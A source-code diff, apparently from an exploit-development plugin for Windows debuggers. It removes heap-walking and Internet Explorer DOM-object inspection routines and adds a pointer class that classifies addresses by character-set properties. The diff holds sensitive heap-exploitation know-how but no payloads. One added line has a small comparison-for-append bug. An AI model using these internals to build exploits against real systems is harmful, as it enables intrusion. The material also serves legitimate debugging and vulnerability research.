-        heapinfo["heap"] = 0
-        heapinfo["segment"] = 0
-        heapinfo["chunk"] = 0
-        heapinfo["size"] = 0
-        allheaps = dbg.getHeapsAddress()
-        for heap in allheaps:
-            dbg.log("checking heap 0x%08x for 0x%08x" % (heap,self.address))
-            theap = dbg.getHeap(heap)
-            heapchunks = theap.getChunks(heap)
-            if len(heapchunks) > 0 and not silent:
-                dbg.log("Querying segment(s) for heap 0x%s" % toHex(heap))
-            for hchunk in heapchunks:
-                chunkbase = hchunk.get("address")
-                chunksize = hchunk.get("size")
-                if self.address >= chunkbase and self.address <= (chunkbase+chunksize):
-                    heapinfo["heap"] = heap
-                    heapinfo["segment"] = 0
-                    heapinfo["chunk"] = chunkbase
-                    heapinfo["size"] = chunksize
-                    return heapinfo
-        return heapinfo
-
-
-    def showObjectInfo(self):
-        # check if chunk is a DOM object
-        if __DEBUGGERAPP__ == "WinDBG":
-            cmdtorun = "dds 0x%08x L 1" % self.address
-            output = dbg.nativeCommand(cmdtorun)
-            outputlower = output.lower()
-            outputlines = output.split("\n")
-            if "vftable" in outputlower:
-                # is this Internet Explorer ?
-                ieversion = 0
-                if isModuleLoadedInProcess('iexplore.exe') and isModuleLoadedInProcess('mshtml.dll'):
-                    ieversionstr = getModuleProperty('iexplore.exe','version')
-                    dbg.log("      Internet Explorer v%s detected" % ieversionstr)
-                    ieversion = 0
-                    if ieversionstr.startswith("8."):
-                        ieversion = 8
-                    if ieversionstr.startswith("9."):
-                        ieversion = 9
-                    if ieversionstr.startswith("10."):
-                        ieversion = 10
-                dbg.log("      0x%08x may be the start of an object, vtable pointer: %s" % (self.address,outputlines[0]))
-                vtableptr_s = outputlines[0][10:18]
-                try:
-                    vtableptr = hexStrToInt(vtableptr_s)
-                    dbg.log("      Start of vtable at 0x%08x: (showing first 4 entries only)" % vtableptr)
-                    cmdtorun = "dds 0x%08x L 4" % vtableptr
-                    output = dbg.nativeCommand(cmdtorun)
-                    outputlines = output.split("\n")
-                    cnt = 0
-                    for line in outputlines:
-                        if line.replace(" ","") != "":
-                            dbg.log("       +0x%x -> %s" % (cnt,line))
-                        cnt += 4
-                    if "mshtml!" in outputlower and ieversion > 7:
-                        # see if we can find the object type, refcounter, attribute count, parent, etc
-                        refcounter = None
-                        attributeptr = None
-                        try:
-                            refcounter = dbg.readLong(self.address + 4)
-                        except:
-                            pass
-                        try:
-                            if ieversion == 8:
-                                attributeptr = dbg.readLong(self.address + 0xc)
-                            if ieversion == 9:
-                                attributeptr = dbg.readLong(self.address + 0x10)
-                        except:
-                            pass
-                        if not refcounter is None and not attributeptr is None:
-                            dbg.log("      Refcounter: 0x%x (%d)" % (refcounter,refcounter))
-                            if refcounter > 0x20000:
-                                dbg.log("      Note: a huge refcounter value may indicate this is not a real DOM object")
-                            if attributeptr == 0:
-                                dbg.log("      No attributes found")
-                            else:
-                                ptrx = MnPointer(attributeptr)
-                                if ptrx.isInHeap():
-                                    dbg.log("      Attribute info structure stored at 0x%08x" % attributeptr)
-                                    offset_nr = 0x4
-                                    nr_multiplier = 4
-                                    offset_tableptr = 0xc
-                                    offset_tabledata = 0
-                                    variant_offset = 4
-                                    attname_offset = 8
-                                    attvalue_offset = 0xc
-                                    if ieversion == 9:
-                                        nr_multiplier = 1
-                                        offset_nr = 0x4
-                                        offset_tableptr = 0x8
-                                        offset_tabledata = 4
-                                        variant_offset = 1
-                                        attname_offset = 4
-                                        attvalue_offset = 8
-
-                                    nr_attributes = dbg.readLong(attributeptr + offset_nr) / nr_multiplier
-                                    attributetableptr = dbg.readLong(attributeptr + offset_tableptr)
-                                    dbg.log("        +0x%02x : Nr of attributes: %d" % (offset_nr,nr_attributes))
-                                    dbg.log("        +0x%02x : Attribute table at 0x%08x" % (offset_tableptr,attributetableptr))
-                                    
-                                    attcnt = 0
-                                    while attcnt < nr_attributes:
-                                        
-                                        try:
-                                            dbg.log("                Attribute %d (at 0x%08x) :" % (attcnt+1,attributetableptr))
-                                            sec_dword = "%08x" % struct.unpack('<L',dbg.readMemory(attributetableptr+4,4))[0]
-                                            variant_type = int(sec_dword[0:2][:-1],16)
-                                            dbg.log("                  Variant Type : 0x%02x (%s)" % (variant_type,getVariantType(variant_type)))
-                                            if variant_type > 0x1:
-                                                att_name = "<n.a.>"
-                                                try:
-                                                    att_name_ptr = dbg.readLong(attributetableptr+attname_offset)
-                                                    att_name_ptr_value = dbg.readLong(att_name_ptr+4)
-                                                    att_name = dbg.readWString(att_name_ptr_value)
-                                                except:
-                                                    att_name = "<n.a.>"
-                                                dbg.log("                  0x%08x + 0x%02x (0x%08x): 0x%08x : &Attribute name : '%s'" % (attributetableptr,attname_offset,attributetableptr+attname_offset,att_name_ptr,att_name))
-                                                att_value_ptr = dbg.readLong(attributetableptr+attvalue_offset)
-                                                ptrx = MnPointer(att_value_ptr)
-                                                if ptrx.isInHeap():
-                                                    att_value = ""
-                                                    if variant_type == 0x8:
-                                                        att_value = dbg.readWString(att_value_ptr)
-                                                    if variant_type == 0x16:
-                                                        attv = dbg.readLong(att_value_ptr)
-                                                        att_value = "0x%08x (%s)" % (attv,int("0x%08x" % attv,16))
-                                                    if variant_type == 0x1e:
-                                                        att_from = dbg.readLong(att_value_ptr)
-                                                        att_value = dbg.readString(att_from)
-                                                    if variant_type == 0x1f:
-                                                        att_from = dbg.readLong(att_value_ptr)
-                                                        att_value = dbg.readWString(att_from)
-                                                else:
-                                                    att_value = "0x%08x (%s)" % (att_value_ptr,int("0x%08x" % att_value_ptr,16))
-                                                dbg.log("                  0x%08x + 0x%02x (0x%08x): 0x%08x : &Value : %s" % (attributetableptr,attvalue_offset,attributetableptr+attvalue_offset,att_value_ptr,att_value))
-                                        except:
-                                            dbg.logLines(traceback.format_exc(),highlight=True)
-                                            break
-                                        attributetableptr += 0x10                                           
-                                        attcnt += 1
-                                else:
-                                    dbg.log("      Invalid attribute ptr found (0x%08x). This may not be a real DOM object." % attributeptr)
-
-
-                        offset_domtree = 0x14
-                        if ieversion == 9:
-                            offset_domtree = 0x1C
-                        domtreeptr = dbg.readLong(self.address + offset_domtree)
-                        if not domtreeptr is None:
-                            dptrx = MnPointer(domtreeptr)
-                            if dptrx.isInHeap():
-                                currobj = self.address
-                                moreparents = True
-                                parentcnt = 0
-                                dbg.log("      Object +0x%02x : Ptr to DOM Tree info: 0x%08x" % (offset_domtree,domtreeptr))                                
-                                while moreparents:
-                                    # walk tree, get parents
-                                    parentspaces = " " * parentcnt
-                                    cmdtorun = "dds poi(poi(poi(0x%08x+0x%02x)+4)) L 1" % (currobj,offset_domtree)
-                                    output = dbg.nativeCommand(cmdtorun)
-                                    outputlower = output.lower()
-                                    outputlines = output.split("\n")
-                                    if "vftable" in outputlines[0]:
-                                        dbg.log("      %s Parent : %s" % (parentspaces,outputlines[0]))
-                                        parts = outputlines[0].split(" ")
-                                        try:
-                                            currobj = int(parts[0],16)
-                                        except:
-                                            currobj = 0
-                                    else:
-                                        moreparents = False
-                                    parentcnt += 3
-                                    if currobj == 0:
-                                        moreparents = False
-
-                except:
-                    dbg.logLines(traceback.format_exc(),highlight=True)
-                    pass
-
-        return
-
-
-
-    def showHeapBlockInfo(self):
-        """
-        Find address in heap and print out info about heap, segment, chunk it belongs to
-        """
-        allheaps = []
-        heapkey = 0
-        
-        foundinheap = None
-        foundinsegment = None
-        foundinva = None
-        foundinchunk = None
-        dumpsize = 0
-        dodump = False
-
-        try:
-            allheaps = dbg.getHeapsAddress()
-        except:
-            allheaps = []
-        for heapbase in allheaps:
-            mHeap = MnHeap(heapbase)
-            heapbase_extra = ""
-            frontendinfo = []
-            frontendheapptr = 0
-            frontendheaptype = 0
-            if win7mode:
-                heapkey = mHeap.getEncodingKey()
-                if mHeap.usesLFH():
-                    frontendheaptype = 0x2
-                    heapbase_extra = " [LFH] "
-                    frontendheapptr = mHeap.getLFHAddress()
-            frontendinfo = [frontendheaptype,frontendheapptr]
-
-            segments = mHeap.getHeapSegmentList()
-
-            #segments
-            for seg in segments:
-                segstart = segments[seg][0]
-                segend = segments[seg][1]
-                FirstEntry = segments[seg][2]
-                LastValidEntry = segments[seg][3]                               
-                allchunks = walkSegment(FirstEntry,LastValidEntry,heapbase)
-                for chunkptr in allchunks:
-                    thischunk = allchunks[chunkptr]
-                    thissize = thischunk.size*8 
-                    headersize = thischunk.headersize
-                    if self.address >= chunkptr and self.address < (chunkptr + thissize):
-                        # found it !
-                        if not silent:
-                            dbg.log("")
-                            dbg.log("Address 0x%08x found in " % self.address)
-                            thischunk.showChunk(showdata = True)
-                            self.showObjectInfo()
-                            self.showHeapStackTrace(thischunk)
-                            dodump = True
-                            dumpsize = thissize
-                        foundinchunk = thischunk
-                        foundinsegment = seg
-                        foundinheap = heapbase
-                        break
-                if not foundinchunk == None:
-                    break
-
-            # VA
-            if foundinchunk == None:
-                # maybe it's in VirtualAllocdBlocks
-                vachunks = mHeap.getVirtualAllocdBlocks()
-                for vaptr in vachunks:
-                    thischunk = vachunks[vaptr]
-                    if self.address >= vaptr and self.address <= vaptr + (thischunk.commitsize*8):
-                        if not silent:
-                            dbg.log("")
-                            dbg.log("Address 0x%08x found in VirtualAllocdBlocks of heap 0x%08x" % (self.address,heapbase))
-                            thischunk.showChunk(showdata = True)
-                            self.showObjectInfo()
-                            self.showHeapStackTrace(thischunk)
-                            thissize = thischunk.usersize
-                            dumpsize = thissize
-                            dodump = True                   
-                        foundinchunk = thischunk
-                        foundinva = vaptr
-                        foundinheap = heapbase
-                        break
-
-            # perhaps chunk is in FEA
-            # if it is, it won't be a VA chunk
-            if foundinva == None:
-                if not win7mode:
-                    foundinlal = False
-                    foundinfreelist = False
-                    FrontEndHeap = mHeap.getFrontEndHeap()
-                    if FrontEndHeap > 0:
-                        fea_lal = mHeap.getLookAsideList()
-                        for lal_table_entry in sorted(fea_lal.keys()):
-                            nr_of_chunks = len(fea_lal[lal_table_entry])
-                            lalhead = struct.unpack('<L',dbg.readMemory(FrontEndHeap + (0x30 * lal_table_entry),4))[0]
-                            for chunkindex in fea_lal[lal_table_entry]:
-                                lalchunk = fea_lal[lal_table_entry][chunkindex]
-                                chunksize = lalchunk.size * 8
-                                flag = getHeapFlag(lalchunk.flag)
-                                if (self.address >= lalchunk.chunkptr) and (self.address < lalchunk.chunkptr+chunksize):
-                                    foundinlal = True
-                                    if not silent:
-                                        dbg.log("Address is part of chunk on LookAsideList[%d], heap 0x%08x" % (lal_table_entry,mHeap.heapbase))
-                                    break
-                            if foundinlal:
-                                expectedsize = lal_table_entry * 8
-                                if not silent:
-                                    dbg.log("     LAL [%d] @0x%08x, Expected Chunksize: 0x%x (%d), %d chunks, Flink: 0x%08x" % (lal_table_entry,FrontEndHeap + (0x30 * lal_table_entry),expectedsize,expectedsize,nr_of_chunks,lalhead))
-                                for chunkindex in fea_lal[lal_table_entry]:
-                                    lalchunk = fea_lal[lal_table_entry][chunkindex]
-                                    foundchunk = lalchunk
-                                    chunksize = lalchunk.size * 8
-                                    flag = getHeapFlag(lalchunk.flag)
-                                    extra = "       "
-                                    if (self.address >= lalchunk.chunkptr) and (self.address < lalchunk.chunkptr+chunksize):
-                                        extra = "   --> "
-                                    if not silent:
-                                        dbg.log("%sChunkPtr: 0x%08x, UserPtr: 0x%08x, Flink: 0x%08x, ChunkSize: 0x%x, UserSize: 0x%x, UserSpace: 0x%x (%s)" % (extra,lalchunk.chunkptr,lalchunk.userptr,lalchunk.flink,chunksize,lalchunk.usersize,lalchunk.usersize + lalchunk.remaining,flag))
-                                if not silent:
-                                    self.showObjectInfo()
-                                    dumpsize = chunksize
-                                    dodump = True
-                                break
-
-                    if not foundinlal:
-                        # or maybe in BEA
-                        thisfreelist = mHeap.getFreeList()
-                        thisfreelistinusebitmap = mHeap.getFreeListInUseBitmap()                
-                        for flindex in thisfreelist:
-                            freelist_addy = heapbase + 0x178 + (8 * flindex)
-                            expectedsize = ">1016"
-                            expectedsize2 = ">0x%x" % 1016
-                            if flindex != 0:
-                                expectedsize2 = str(8 * flindex)
-                                expectedsize = "0x%x" % (8 * flindex)
-                            for flentry in thisfreelist[flindex]:
-                                freelist_chunk = thisfreelist[flindex][flentry]
-                                chunksize = freelist_chunk.size * 8
-                                if (self.address >= freelist_chunk.chunkptr) and (self.address < freelist_chunk.chunkptr+chunksize):
-                                    foundinfreelist = True
-                                    if not silent:
-                                        dbg.log("Address is part of chunk on FreeLists[%d] at 0x%08x, heap 0x%08x:" % (flindex,freelist_addy,mHeap.heapbase))
-                                    break
-                            if foundinfreelist:
-                                flindicator = 0
-                                for flentry in thisfreelist[flindex]:
-                                    freelist_chunk = thisfreelist[flindex][flentry]
-                                    chunksize = freelist_chunk.size * 8 
-                                    extra = "     "
-                                    if (self.address >= freelist_chunk.chunkptr) and (self.address < freelist_chunk.chunkptr+chunksize):                        
-                                        extra = " --> "
-                                        foundchunk = freelist_chunk
-                                    if not silent:
-                                        dbg.log("%sChunkPtr: 0x%08x, UserPtr: 0x%08x, Flink: 0x%08x, Blink: 0x%08x, ChunkSize: 0x%x (%d), Usersize: 0x%x (%d)" % (extra,freelist_chunk.chunkptr,freelist_chunk.userptr,freelist_chunk.flink,freelist_chunk.blink,chunksize,chunksize,freelist_chunk.usersize,freelist_chunk.usersize))
-                                    if flindex != 0 and chunksize != (8*flindex):
-                                        dbg.log("     ** Header may be corrupted! **", highlight = True)
-                                    flindicator = 1
-                                if flindex > 1 and int(thisfreelistinusebitmap[flindex]) != flindicator:
-                                    if not silent:
-                                        dbg.log("     ** FreeListsInUseBitmap mismatch for index %d! **" % flindex, highlight = True)
-                                if not silent:
-                                    self.showObjectInfo()
-                                    dumpsize = chunksize
-                                    dodump = True
-                                break       
-
-        if dodump and dumpsize > 0 and dumpsize < 1025 and not silent:
-            self.dumpObjectAtLocation(dumpsize) 
-
-        return foundinheap, foundinsegment, foundinva, foundinchunk
-
-    def showHeapStackTrace(self,thischunk):
-        # show stacktrace if any
-        if __DEBUGGERAPP__ == "WinDBG": 
-            stacktrace_address = thischunk.dph_block_information_stacktrace
-            stacktrace_index = thischunk.dph_block_information_traceindex
-            stacktrace_startstamp = 0xabcdaaaa
-            if thischunk.hasust and stacktrace_address > 0:
-                if stacktrace_startstamp == thischunk.dph_block_information_startstamp:
-                    cmd2run = "dds 0x%08x L 24" % (stacktrace_address)
-                    output = dbg.nativeCommand(cmd2run)
-                    outputlines = output.split("\n")
-                    if "!" in output:
-                        dbg.log("Stack trace, index 0x%x:" % stacktrace_index)
-                        dbg.log("--------------------------")
-                        for outputline in outputlines:
-                            if "!" in outputline:
-                                lineparts = outputline.split(" ")
-                                if len(lineparts) > 2:
-                                    firstpart = len(lineparts[0])+1
-                                    dbg.log(outputline[firstpart:])
-        return
-    
-    def memLocation(self):
-        """
-        Gets the memory location associated with a given pointer (modulename, stack, heap or empty)
-        
-        Arguments:
-        None
-        
-        Return:
-        String
-        """
-
-        memloc = self.belongsTo()
-        
-        if memloc == "":
-            if self.isOnStack():
-                return "Stack"
-            if self.isInHeap():
-                return "Heap"
-            return "??"
-        return memloc
-
-    def getPtrFunction(self):
-        funcinfo = ""
-        global silent
-        silent = True
-        if __DEBUGGERAPP__ == "WinDBG":
-            lncmd = "ln 0x%08x" % self.address
-            lnoutput = dbg.nativeCommand(lncmd)
-            for line in lnoutput.split("\n"):
-                if line.replace(" ","") != "" and line.find("%08x" % self.address) > -1:
-                    lineparts = line.split("|")
-                    funcrefparts = lineparts[0].split(")")
-                    if len(funcrefparts) > 1:
-                        funcinfo = funcrefparts[1].replace(" ","")
-                        break
-
-        if funcinfo == "":
-            memloc = self.belongsTo()
-            if not memloc == "":
-                mod = MnModule(memloc)
-                if not mod is None:
-                    start = mod.moduleBase
-                    offset = self.address - start
-                    offsettxt = ""
-                    if offset > 0:
-                        offsettxt = "+0x%08x" % offset
-                    else:
-                        offsettxt = "__base__"
-                    funcinfo = memloc+offsettxt
-        silent = False
-        return funcinfo
-
-    def dumpObjectAtLocation(self,size,levels=0,nestedsize=0,customthislog="",customlogfile=""):
-        dumpdata = {}
-        origdumpdata = {} 
-        if __DEBUGGERAPP__ == "WinDBG":
-            addy = self.address
-            if not silent:
-                dbg.log("")
-                dbg.log("----------------------------------------------------")
-                dbg.log("[+] Dumping object at 0x%08x, 0x%02x bytes" % (addy,size))
-                if levels > 0:
-                    dbg.log("[+] Also dumping up to %d levels deep, max size of nested objects: 0x%02x bytes" % (levels, nestedsize))
-                dbg.log("")
-
-            parentlist = []
-            levelcnt = 0
-            if customthislog == "" and customlogfile == "":
-                logfile = MnLog("dumpobj.txt")
-                thislog = logfile.reset()
-            else:
-                logfile = customlogfile
-                thislog = customthislog
-            addys = [addy]
-            parent = ""
-            parentdata = {}
-            while levelcnt <= levels:
-                thisleveladdys = []
-                for addy in addys:
-                    cmdtorun = "dps 0x%08x L 0x%02x/%x" % (addy,size,archValue(4,8))
-                    startaddy = addy
-                    endaddy = addy + size
-                    output = dbg.nativeCommand(cmdtorun)
-                    outputlines = output.split("\n")
-                    offset = 0
-                    for outputline in outputlines:
-                        if not outputline.replace(" ","") == "":
-                            loc = outputline[0:archValue(8,17)].replace("`","")
-                            content = outputline[archValue(10,19):archValue(18,36)].replace("`","")
-                            symbol = outputline[archValue(19,37):]
-                            if not "??" in content and symbol.replace(" ","") == "":
-                                contentaddy = hexStrToInt(content)
-                                info = self.getLocInfo(hexStrToInt(loc),contentaddy,startaddy,endaddy)
-                                info.append(content)
-                                dumpdata[hexStrToInt(loc)] = info
-                            else:
-                                info = ["",symbol,"",content]
-                                dumpdata[hexStrToInt(loc)] = info
-                    if addy in parentdata:
-                        pdata = parentdata[addy]
-                        parent = "Referenced at 0x%08x (object 0x%08x, offset +0x%02x)" % (pdata[0],pdata[1],pdata[0]-pdata[1])
-                    else:
-                        parent = ""
-                    self.printObjDump(dumpdata,logfile,thislog,size,parent)
-
-                    for loc in dumpdata:
-                        thisdata = dumpdata[loc]
-                        if thisdata[0] == "ptr_obj":
-                            thisptr = int(thisdata[3],16)
-                            thisleveladdys.append(thisptr)
-                            parentdata[thisptr] = [loc,addy]
-                    if levelcnt == 0:
-                        origdumpdata = dumpdata
-                    dumpdata = {}
-                addys = thisleveladdys
-                size = nestedsize
-                levelcnt += 1
-        dumpdata = origdumpdata
-        return dumpdata
-
-
-    def printObjDump(self,dumpdata,logfile,thislog,size=0,parent=""):
-        # dictionary, key = address
-        # 0 = type
-        # 1 = content info
-        # 2 = string type
-        # 3 = content
-        sortedkeys = sorted(dumpdata)
-        if len(sortedkeys) > 0:
-            startaddy = sortedkeys[0]
-            sizem = ""
-            parentinfo = ""
-            if size > 0:
-                sizem = " (0x%02x bytes)" % size
-            logfile.write("",thislog)
-
-            if parent == "":
-                logfile.write("=" * 60,thislog)
-
-            line = ">> Object at 0x%08x%s:" % (startaddy,sizem)
-            if not silent:
-                dbg.log("")
-                dbg.log(line)
-            
-            logfile.write(line,thislog)
-
-            if parent != "":
-                line = "   %s" % parent
-                if not silent:
-                    dbg.log(line)
-                logfile.write(line,thislog)
-
-            line = "Offset  Address      Contents    Info"
-            if arch == 64:
-                line = "Offset  Address          Contents            Info"
-            logfile.write(line,thislog)
-            if not silent:
-                dbg.log(line)
-            line = "------  -------      --------    -----"
-            if arch == 64:
-                line = "------  -------          --------            -----"
-            logfile.write(line,thislog)
-            if not silent:
-                dbg.log(line)
-
-            offset = 0
-            
-            for loc in sortedkeys:
-                info = dumpdata[loc]
-                if len(info) > 1:
-                    content = ""
-                    if len(info) > 3:
-                        content = info[3]
-                    contentinfo = toAsciiOnly(info[1])
-                    offsetstr = toSize("%02x" % offset,4)
-                    line = "+%s   0x%08x | 0x%s  %s" % (offsetstr,loc,content,contentinfo)
-                    if not silent:
-                        dbg.log(line)
-                    logfile.write(line,thislog)
-                    offset += archValue(4,8)
-            if len(sortedkeys) > 0:
-                dbg.log("")
-        return
-
-    def getLocInfo(self,loc,addy,startaddy,endaddy):
-        locinfo = []
-        
-        if addy >= startaddy and addy <= endaddy:
-            offset = addy - startaddy
-            locinfo = ["self","ptr to self+0x%08x" % offset,""]
-            return locinfo
-            
-        ismapped = False
-
-        extra = ""
-        ptrx = MnPointer(addy)
-
-        memloc = ptrx.memLocation()
-        if not "??" in memloc:
-            if "Stack" in memloc or "Heap" in memloc:
-                extra = "(%s) " % memloc
-            else:
-                detailmemloc = ptrx.getPtrFunction()
-                extra = " (%s.%s)" % (memloc,detailmemloc)
-
-        # maybe it's a pointer to an object ?
-        cmd2run = "dps 0x%08x L 1" % addy
-        output = dbg.nativeCommand(cmd2run)
-        outputlines = output.split("\n")
-        if len(outputlines) > 0:
-            if not "??" in outputlines[0]:
-                ismapped = True
-                ptraddy = outputlines[0][archValue(10,19):archValue(18,36)].replace("`","")
-                ptrinfo = outputlines[0][archValue(19,37):]
-                if ptrinfo.replace(" ","") != "":
-                    if "vftable" in ptrinfo or "Heap" in memloc:
-                        locinfo = ["ptr_obj","%sptr to 0x%08x : %s" % (extra,hexStrToInt(ptraddy),ptrinfo),str(addy)]
-                    else:
-                        locinfo = ["ptr","%sptr to 0x%08x : %s" % (extra,hexStrToInt(ptraddy),ptrinfo),str(addy)]
-                    return locinfo
-
-        if ismapped:
-
-            # pointer to a string ?
-            try:
-                strdata = dbg.readString(addy)
-                if len(strdata) > 2:
-                    datastr = strdata
-                    if len(strdata) > 80:
-                        datastr = strdata[0:80] + "..."
-                    locinfo = ["ptr_str","%sptr to ASCII (0x%02x) '%s'" % (extra,len(strdata),datastr),"ascii"]
-                    return locinfo
-            except:
-                pass
-
-            # maybe it's unicode ?
-            try:
-                strdata = dbg.readWString(addy)
-                if len(strdata) > 2:
-                    datastr = strdata
-                    if len(strdata) > 80:
-                        datastr = strdata[0:80] + "..."
-                    locinfo = ["ptr_str","%sptr to UNICODE (0x%02x) '%s'" % (extra,len(strdata),datastr),"unicode"]
-                    return locinfo
-            except:
-                pass
-
-            # maybe the pointer points into a function ?
-            ptrf = ptrx.getPtrFunction()
-            if not ptrf == "":
-                locinfo = ["ptr_func","%sptr to %s" % (extra,ptrf),str(addy)]
-                return locinfo
-
-
-            # BSTR Unicode ?
-            try:
-                bstr = struct.unpack('<L',dbg.readMemory(addy,4))[0]
-                strdata = dbg.readWString(addy+4)
-                if len(strdata) > 2 and (bstr == len(strdata)+1):
-                    datastr = strdata
-                    if len(strdata) > 80:
-                        datastr = strdata[0:80] + "..."
-                    locinfo = ["ptr_str","%sptr to BSTR UNICODE (0x%02x) '%s'" % (extra,bstr,datastr),"unicode"]
-                    return locinfo
-            except:
-                pass
-
-
-            # pointer to a BSTR ASCII?
-            try:
-                strdata = dbg.readString(addy+4)
-                if len(strdata) > 2 and (bstr == len(strdata)/2):
-                    datastr = strdata
-                    if len(strdata) > 80:
-                        datastr = strdata[0:80] + "..."
-                    locinfo = ["ptr_str","%sptr to BSTR ASCII (0x%02x) '%s'" % (extra,bstr,datastr),"ascii"]
-                    return locinfo
-            except:
-                pass
-
-
-
-        # pointer itself is a string ?
-        
-        if ptrx.isUnicode:
-            b1,b2,b3,b4,b5,b6,b7,b8 = (0,)*8
-            if arch == 32:
-                b1,b2,b3,b4 = splitAddress(addy)
-            if arch == 64:
-                b1,b2,b3,b4,b5,b6,b7,b8 = splitAddress(addy)
-            ptrstr = toAscii(toHexByte(b2)) + toAscii(toHexByte(b4))
-            if arch == 64:
-                ptrstr += toAscii(toHexByte(b6)) + toAscii(toHexByte(b8))
-            if ptrstr.replace(" ","") != "" and not toHexByte(b2) == "00":
-                locinfo = ["str","= UNICODE '%s' %s" % (ptrstr,extra),"unicode"]
-                return locinfo
-
-        
-        if ptrx.isAsciiPrintable:
-            b1,b2,b3,b4,b5,b6,b7,b8 = (0,)*8
-            if arch == 32:
-                b1,b2,b3,b4 = splitAddress(addy)
-            if arch == 64:
-                b1,b2,b3,b4,b5,b6,b7,b8 = splitAddress(addy)
-            ptrstr = toAscii(toHexByte(b1)) + toAscii(toHexByte(b2)) + toAscii(toHexByte(b3)) + toAscii(toHexByte(b4))
-            if arch == 64:
-                ptrstr += toAscii(toHexByte(b5)) + toAscii(toHexByte(b6)) + toAscii(toHexByte(b7)) + toAscii(toHexByte(b8))
-            if ptrstr.replace(" ","") != "" and not toHexByte(b1) == "00" and not toHexByte(b2) == "00" and not toHexByte(b3) == "00" and not toHexByte(b4) == "00":
-                if arch != 64 or (not toHexByte(b5) == "00" and not toHexByte(b6) == "00" and not toHexByte(b7) == "00" and not toHexByte(b8) == "00"):
-                    locinfo = ["str","= ASCII '%s' %s" % (ptrstr,extra),"ascii"]
-                    return locinfo
-
-        # pointer to heap ?
-        if "Heap" in memloc:
-            if not "??" in outputlines[0]:
-                ismapped = True
-                ptraddy = outputlines[0][archValue(10,19):archValue(18,36)]
-                locinfo = ["ptr_obj","%sptr to 0x%08x" % (extra,hexStrToInt(ptraddy)),str(addy)]
-                return locinfo
-
-        # nothing special to report
-        return ["","",""]
-
-
-        
+	"""
+	Class to access pointer properties
+	"""
+	def __init__(self,address):
+	
+		# check that the address is an integer
+		if not type(address) == int and not type(address) == long:
+			raise Exception("address should be an integer or long")
+	
+		self.address = address
+		
+		NullRange 			= [0]
+		AsciiRange			= range(1,128)
+		AsciiPrintRange		= range(20,127)
+		AsciiUppercaseRange = range(65,91)
+		AsciiLowercaseRange = range(97,123)
+		AsciiAlphaRange     = AsciiUppercaseRange + AsciiLowercaseRange
+		AsciiNumericRange   = range(48,58)
+		AsciiSpaceRange     = [32]
+		
+		self.HexAddress = toHex(address)
+
+		# define the characteristics of the pointer
+		byte1,byte2,byte3,byte4,byte5,byte6,byte7,byte8 = (0,)*8
+
+		if arch == 32:
+			byte1,byte2,byte3,byte4 = splitAddress(address)
+		elif arch == 64:
+			byte1,byte2,byte3,byte4,byte5,byte6,byte7,byte8 = splitAddress(address)
+		
+		# Nulls
+		self.hasNulls = (byte1 == 0) or (byte2 == 0) or (byte3 == 0) or (byte4 == 0)
+		
+		# Starts with null
+		self.startsWithNull = (byte1 == 0)
+		
+		# Unicode
+		self.isUnicode = ((byte1 == 0) and (byte3 == 0))
+		
+		# Unicode reversed
+		self.isUnicodeRev = ((byte2 == 0) and (byte4 == 0))
+
+		if arch == 64:
+			self.hasNulls = self.hasNulls or (byte5 == 0) or (byte6 == 0) or (byte7 == 0) or (byte8 == 0)
+			self.isUnicode = self.isUnicode and ((byte5 == 0) and (byte7 == 0))
+			self.isUnicodeRev = self.isUnicodeRev and ((byte6 == 0) and (byte8 == 0))
+		
+		# Unicode transform
+		self.unicodeTransform = UnicodeTransformInfo(self.HexAddress) 
+
+		# Ascii
+		if not self.isUnicode and not self.isUnicodeRev:			
+			self.isAscii = bytesInRange(address, AsciiRange)
+		else:
+			self.isAscii = bytesInRange(address, NullRange + AsciiRange)
+		
+		# AsciiPrintable
+		if not self.isUnicode and not self.isUnicodeRev:
+			self.isAsciiPrintable = bytesInRange(address, AsciiPrintRange)
+		else:
+			self.isAsciiPrintable = bytesInRange(address, NullRange + AsciiPrintRange)
+			
+		# Uppercase
+		if not self.isUnicode and not self.isUnicodeRev:
+			self.isUppercase = bytesInRange(address, AsciiUppercaseRange)
+		else:
+			self.isUppercase = bytesInRange(address, NullRange + AsciiUppercaseRange)
+		
+		# Lowercase
+		if not self.isUnicode and not self.isUnicodeRev:
+			self.isLowercase = bytesInRange(address, AsciiLowercaseRange)
+		else:
+			self.isLowercase = bytesInRange(address, NullRange + AsciiLowercaseRange)
+			
+		# Numeric
+		if not self.isUnicode and not self.isUnicodeRev:
+			self.isNumeric = bytesInRange(address, AsciiNumericRange)
+		else:
+			self.isNumeric = bytesInRange(address, NullRange + AsciiNumericRange)
+			
+		# Alpha numeric
+		if not self.isUnicode and not self.isUnicodeRev:
+			self.isAlphaNumeric = bytesInRange(address, AsciiAlphaRange + AsciiNumericRange + AsciiSpaceRange)
+		else:
+			self.isAlphaNumeric = bytesInRange(address, NullRange + AsciiAlphaRange + AsciiNumericRange + AsciiSpaceRange)
+		
+		# Uppercase + Numbers
+		if not self.isUnicode and not self.isUnicodeRev:
+			self.isUpperNum = bytesInRange(address, AsciiUppercaseRange + AsciiNumericRange)
+		else:
+			self.isUpperNum = bytesInRange(address, NullRange + AsciiUppercaseRange + AsciiNumericRange)
+		
+		# Lowercase + Numbers
+		if not self.isUnicode and not self.isUnicodeRev:
+			self.isLowerNum = bytesInRange(address, AsciiLowercaseRange + AsciiNumericRange)
+		else:
+			self.isLowerNum = bytesInRange(address, NullRange + AsciiLowercaseRange + AsciiNumericRange)
+		
+	
+	def __str__(self):
+		"""
+		Get pointer properties (human readable format)
+
+		Arguments:
+		None
+
+		Return:
+		String with various properties about the pointer
+		"""	
+
+		outstring = ""
+		if self.startsWithNull:
+			outstring += "startnull,"
+			
+		elif self.hasNulls:
+			outstring += "null,"
+		
+		#check if this pointer is unicode transform
+		hexaddr = self.HexAddress
+		outstring += UnicodeTransformInfo(hexaddr)
+
+		if self.isUnicode:
+			outstring += "unicode,"
+		if self.isUnicodeRev:
+			outstring += "unicodereverse,"			
+		if self.isAsciiPrintable:
+			outstring += "asciiprint,"
+		if self.isAscii:
+			outstring += "ascii,"
+		if self.isUppercase:
+			outstring == "upper,"
+		if self.isLowercase:
+			outstring += "lower,"
+		if self.isNumeric:
+			outstring+= "num,"
+			
+		if self.isAlphaNumeric and not (self.isUppercase or self.isLowercase or self.isNumeric):
+			outstring += "alphanum,"
+		
+		if self.isUpperNum and not (self.isUppercase or self.isNumeric):
+			outstring += "uppernum,"
+		
+		if self.isLowerNum and not (self.isLowercase or self.isNumeric):
+			outstring += "lowernum,"
+			
+		outstring = outstring.rstrip(",")
+		outstring += " {" + getPointerAccess(self.address)+"}"
